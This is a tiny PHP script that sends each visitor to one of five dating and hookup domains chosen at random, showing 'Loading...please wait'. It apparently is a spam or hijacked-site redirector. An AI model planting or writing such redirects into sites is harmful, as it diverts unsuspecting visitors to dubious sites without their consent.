<?php
$urls = array("personalwebdating.com",
              "findwebromance.com",
              "freedatesfind.com",
              "newhotprofiles.com",
              "tophookupservice.com");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

